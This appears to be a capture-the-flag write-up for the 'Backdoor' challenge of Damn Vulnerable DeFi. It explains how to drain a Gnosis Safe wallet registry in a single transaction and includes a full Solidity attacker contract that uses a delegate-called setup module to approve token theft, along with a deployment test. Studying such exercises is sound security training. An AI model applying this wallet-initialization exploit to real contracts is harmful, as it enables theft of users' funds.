# #11 Backdoor Damn Vulnerable Defi

## Goals

=> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

=> To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.

=> Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

=> Your goal is to take all funds from the registry. In a single transaction.

### Hints

- Look at the initialization functions

### Solution

- So we need to trigger the `proxyCreated()` function which has a bunch of checks we need to pass, in the comment it says to use the `createProxyWithCallback()` inside the `GnosisSafeProxyFactory`, we need to create a Gnosis wallet through this function, to pass the check for `if(msg.sender != walletFactory)`
- Now we can create new Gnosis safes with anyone as the owner which means we can create a safe on the behalf of the beneficiaries and then ensure the factory calls back to the WalletRegistry contract. During this callback the contract will transfer 10 DVT to the newly created Gnosis safe. However we are unable to access it since it is solely owned by one of the beneficiaries.
- To get around this we can install a backdoor module into the Gnosis safe on initialization which DOES NOT require the signatures of the owners(deployment only but if you try to add a module after deployment it does require signatures).
- You can exploit this via execTransactionFromModule() or even more simply, you can run the exploit on the initialisation code of your module. Within this code you can approve the attacker/smart contract to spend the funds of the Gnosis wallet.
- General Steps done inside the smart contract:

1. Generate the ABI to call the `setupToken()` function in the attacker contract
2. `exploit()`: Call exploit with the generated ABI and the list of targets
3. `exploit()`: Generate the ABI to setup the new Gnosis wallet with the ABI from step 1 that the callback address & function is the wallet registry
4. `exploit()`: Call the `ProxyFactory` contract with the ABI from step 3 and a callback to the WalletRegistry `proxyCreated()` function.
5. `createProxyWithCallback()`: Deploys the new Proxy and calls `setup()` on the proxy
6. `setup()`: New proxy is setup and sets up our `BackdoorModule` calling back to the attacker contract however this time it is a delegate call meaning that it is executed in the context of the newly create proxy contract.
7. `setupToken()`: (proxy context) approves 10 eth (or any arbitrary value) to be spent by the attacker contract of the proxies token funds
8. `proxyCreated()`: Callback executed on the wallet registry which will pass checks and transfers 10 eth to the newly created wallet
9. `exploit()`: Transfer the 10 eth from the Gnosis wallet to the attacker address
10. Repeat as often as desired from within the contracts constructor to perform the attack in 1 transaction.

### Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract AttackWallet {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address[] memory users
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;

        // Deploy module contract (this will enable us to approve us
        // for the tokens in the setup process)
        BackdoorModule abm = new BackdoorModule();

        // Setup module setup data
        string memory setupTokenSignature = "approve(address,address,uint256)";
        bytes memory setupData = abi.encodeWithSignature(
            setupTokenSignature,
            address(this),
            address(token),
            10 ether
        );
        // Loop each user
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory target = new address[](1);
            target[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory gnosisSetupData = abi.encodeWithSignature(
                signatureString,
                target,
                uint256(1),
                address(abm),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            // Deploy the proxy with the malicious data in gnosisSetupData
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    gnosisSetupData,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            // Proxy has approved our contract for transfer in the setup process
            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}

// Backdoor module contract that has to be deployed seperately so
// It is able to be called before the above contract's constructor is completed
// It is delegate called so we are not calling the token approval directly.
contract BackdoorModule {
    function approve(
        address approvalAddress,
        address token,
        uint256 amount
    ) public {
        DamnValuableToken(token).approve(approvalAddress, amount);
    }
}

```

### Test

```javascript
it('Execution', async function () {
	const AttackWalletFactory = await ethers.getContractFactory('AttackWallet', player);
	await AttackWalletFactory.deploy(
		player.address,
		walletFactory.address,
		masterCopy.address,
		walletRegistry.address,
		token.address,
		users
	);
});
```
